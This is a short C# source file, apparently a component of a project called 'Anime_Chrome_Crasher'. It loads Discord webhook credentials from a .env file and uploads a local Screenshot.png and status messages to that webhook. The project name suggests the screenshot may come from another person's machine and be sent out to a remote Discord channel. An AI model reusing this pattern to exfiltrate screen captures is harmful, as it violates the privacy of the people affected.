using Discord.Webhook;
using DotNetEnv;
using System;
using System.IO;

namespace Anime_Chrome_Crasher
{
    class WeebHook
    {
        static string token = "";
        static string webhookID;

        static DiscordWebhookClient discord;

        //sets the directory to where the .env file should be placed.
        public static void ChangeDir()
        {   
            Environment.CurrentDirectory = Path.GetFullPath(Path.Combine(Environment.CurrentDirectory, @"..\..\..\"));
            try { Env.Load(); }
            catch (Exception)
            {
                Environment.Exit(0);
            }
            token = Environment.GetEnvironmentVariable("WEBHOOK_ID");
            webhookID = Environment.GetEnvironmentVariable("WEBHOOK_TOKEN");
            discord = new DiscordWebhookClient(Convert.ToUInt64(token), webhookID);
        }

        public static void SendMessage(string message)
        {
            discord.SendMessageAsync(message);
        }

        public static void SendImage()
        {
            string fileLocation = Environment.CurrentDirectory + @"\Screenshot.png";
            if (File.Exists(fileLocation)) {
                try
                {
                    discord.SendFileAsync(fileLocation, " ");
                }
                catch (Exception)
                {
                    SendMessage("Failed to send Screenshot :(!");
                }
            }
        }
    }   
}